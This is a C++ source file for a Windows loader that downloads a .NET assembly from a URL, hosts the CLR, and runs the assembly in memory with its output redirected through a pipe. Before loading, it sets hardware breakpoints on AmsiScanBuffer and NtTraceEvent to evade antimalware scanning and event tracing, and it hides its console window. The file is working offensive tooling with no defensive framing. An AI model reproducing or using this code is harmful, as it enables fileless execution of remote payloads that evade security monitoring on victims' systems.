#include <Windows.h>
#include <metahost.h>
#include <stdio.h>
#include <ntstatus.h>
#include <wininet.h>

#include "HwBpEngine.h"

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "wininet.lib")

#define PIPE_BUFFER_LENGTH 0x10000 * 5

namespace mscorlib {
#include "mscorlib.h"
}



BOOL ReadFileFromURLA(
    IN LPCSTR url,
    OUT PBYTE* ppFileBuffer,
    OUT PDWORD pdwFileSize
) {
    HINTERNET hInternet = NULL, hConnect = NULL;
    PBYTE pBaseAddress = NULL;
    DWORD dwFileSize = 0, dwBytesRead = 0, totalBytesRead = 0;

    if (!url || !ppFileBuffer || !pdwFileSize) {
        printf("[-] Invalid parameters passed to ReadFileFromURLA.\n");
        return FALSE;
    }

    hInternet = InternetOpenA("FileDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("[-] InternetOpenA failed with error: %lu\n", GetLastError());
        return FALSE;
    }

    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        printf("[-] InternetOpenUrlA failed for URL: %s, Error: %lu\n", url, GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    pBaseAddress = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024); // Start with 1MB buffer
    if (!pBaseAddress) {
        printf("[-] HeapAlloc failed. Error: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    do {
        if (totalBytesRead + 1024 > dwFileSize) {
            dwFileSize = (dwFileSize + 1024) * 2;
            PBYTE newBuffer = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pBaseAddress, dwFileSize);
            if (!newBuffer) {
                printf("[-] HeapReAlloc failed. Error: %lu\n", GetLastError());
                HeapFree(GetProcessHeap(), 0, pBaseAddress);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                return FALSE;
            }
            pBaseAddress = newBuffer;
        }

        if (!InternetReadFile(hConnect, pBaseAddress + totalBytesRead, 1024, &dwBytesRead)) {
            printf("[-] InternetReadFile failed. Error: %lu\n", GetLastError());
            HeapFree(GetProcessHeap(), 0, pBaseAddress);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return FALSE;
        }
        totalBytesRead += dwBytesRead;
    } while (dwBytesRead > 0);

    *pdwFileSize = totalBytesRead;
    *ppFileBuffer = pBaseAddress;

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return TRUE;
}

HRESULT DotnetExecute(
	_In_  PBYTE  AssemblyBytes,
	_In_  ULONG  AssemblySize,
	_In_  PWSTR  AppDomainName,
	_In_  PWSTR  Arguments,
	_Out_ LPSTR* OutputBuffer,
	_Out_ PULONG OutputLength
) {
	HRESULT			       HResult = {};
	ICLRMetaHost* IMetaHost = {};
	ICLRRuntimeInfo* IRuntimeInfo = {};
	ICorRuntimeHost* IRuntimeHost = {};
	IUnknown* IAppDomainThunk = {};
	mscorlib::_AppDomain* AppDomain = {};
	mscorlib::_Assembly* Assembly = {};
	mscorlib::_MethodInfo* MethodInfo = {};
	SAFEARRAYBOUND		   SafeArrayBound = {};
	SAFEARRAY* SafeAssembly = {};
	SAFEARRAY* SafeExpected = {};
	SAFEARRAY* SafeArguments = {};
	PWSTR* AssemblyArgv = {};
	ULONG 				   AssemblyArgc = {};
	LONG				   Index = {};
	VARIANT                VariantArgv = {};
	BOOL			       IsLoadable = {};
	HWND				   ConExist = {};
	HWND				   ConHandle = {};
	HANDLE				   BackupHandle = {};
	HANDLE				   IoPipeRead = {};
	HANDLE				   IoPipeWrite = {};
	SECURITY_ATTRIBUTES    SecurityAttr = {};
	HANDLE				   ExceptionHandle = {};

	//
	// create the CLR instance 
	//
	if ((HResult = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<PVOID*>(&IMetaHost)))) {
		printf("[-] CLRCreateInstance Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}

	if ((HResult = IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, reinterpret_cast<PVOID*>(&IRuntimeInfo)))) {
		printf("[-] IMetaHost->GetRuntime Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}

	if ((HResult = IRuntimeInfo->IsLoadable(&IsLoadable)) || !IsLoadable) {
		printf("[-] IRuntimeInfo->IsLoadable Failed with Error: %lx (IsLoadable: %s)\n", HResult, IsLoadable ? "true" : "false");
		goto _END_OF_FUNC;
	}

	if ((HResult = IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<PVOID*>(&IRuntimeHost)))) {
		printf("[-] IRuntimeInfo->GetInterface Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}

	if ((HResult = IRuntimeHost->Start())) {
		printf("[-] IRuntimeHost->Start Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}

	if ((HResult = IRuntimeHost->CreateDomain(AppDomainName, nullptr, &IAppDomainThunk))) {
		printf("[-] IRuntimeHost->CreateDomain Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}

	if ((HResult = IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain)))) {
		printf("[-] IAppDomainThunk->QueryInterface Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}

	SafeArrayBound = { AssemblySize, 0 };
	SafeAssembly = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);

	memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);

	HwbpEngineBreakpoint(0, GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer"));
	HwbpEngineBreakpoint(1, GetProcAddress(LoadLibraryA("ntdll.dll"), "NtTraceEvent"));
	if (!(ExceptionHandle = AddVectoredExceptionHandler(TRUE, (PVECTORED_EXCEPTION_HANDLER)HwbpEngineHandler))) {
		printf("[-] AddVectoredContinueHandler Failed with Error: %lx\n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((HResult = AppDomain->Load_3(SafeAssembly, &Assembly))) {
		printf("[-] AppDomain->Load_3 Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}

	if ((HResult = Assembly->get_EntryPoint(&MethodInfo))) {
		printf("[-] Assembly->get_EntryPoint Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}

	if ((HResult = MethodInfo->GetParameters(&SafeExpected))) {
		printf("[-] MethodInfo->GetParameters Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}

	if (SafeExpected) {
		if (SafeExpected->cDims && SafeExpected->rgsabound[0].cElements) {
			SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);

			if (wcslen(Arguments)) {
				AssemblyArgv = CommandLineToArgvW(Arguments, (PINT)&AssemblyArgc);
			}

			VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);
			VariantArgv.vt = (VT_ARRAY | VT_BSTR);

			for (Index = 0; Index < AssemblyArgc; Index++) {
				SafeArrayPutElement(VariantArgv.parray, &Index, SysAllocString(AssemblyArgv[Index]));
			}

			Index = 0;
			SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
			SafeArrayDestroy(VariantArgv.parray);
		}
	}

	SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
	if (!(CreatePipe(&IoPipeRead, &IoPipeWrite, nullptr, PIPE_BUFFER_LENGTH))) {
		printf("[-] CreatePipe Failed with Error: %lx\n", GetLastError());
		HResult = GetLastError();
		goto _END_OF_FUNC;
	}

	if (!(ConExist = GetConsoleWindow())) {
		AllocConsole();
		if ((ConHandle = GetConsoleWindow())) {
			ShowWindow(ConHandle, SW_HIDE);
		}
	}

	BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);

	if ((HResult = MethodInfo->Invoke_3(VARIANT(), SafeArguments, nullptr))) {
		printf("[-] MethodInfo->GetParameters Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}

	if ((*OutputBuffer = static_cast<LPSTR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PIPE_BUFFER_LENGTH)))) {
		if (!ReadFile(IoPipeRead, *OutputBuffer, PIPE_BUFFER_LENGTH, OutputLength, nullptr)) {
			printf("[-] ReadFile Failed with Error: %lx\n", GetLastError());
			goto _END_OF_FUNC;
		}
	}
	else {
		HResult = ERROR_NOT_ENOUGH_MEMORY;
	}

_END_OF_FUNC:
	HwbpEngineBreakpoint(0, nullptr);
	HwbpEngineBreakpoint(1, nullptr);
	RemoveVectoredExceptionHandler(ExceptionHandle);

	if (BackupHandle) {
		SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
	}

	if (IoPipeRead) {
		CloseHandle(IoPipeRead);
	}

	if (IoPipeWrite) {
		CloseHandle(IoPipeWrite);
	}

	if (AssemblyArgv) {
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, AssemblyArgv);
		AssemblyArgv = nullptr;
	}

	if (SafeAssembly) {
		SafeArrayDestroy(SafeAssembly);
		SafeAssembly = nullptr;
	}

	if (SafeArguments) {
		SafeArrayDestroy(SafeArguments);
		SafeArguments = nullptr;
	}

	if (MethodInfo) {
		MethodInfo->Release();
	}

	if (IRuntimeHost) {
		IRuntimeHost->Release();
	}

	if (IRuntimeInfo) {
		IRuntimeInfo->Release();
	}

	if (IMetaHost) {
		IMetaHost->Release();
	}

	return HResult;
}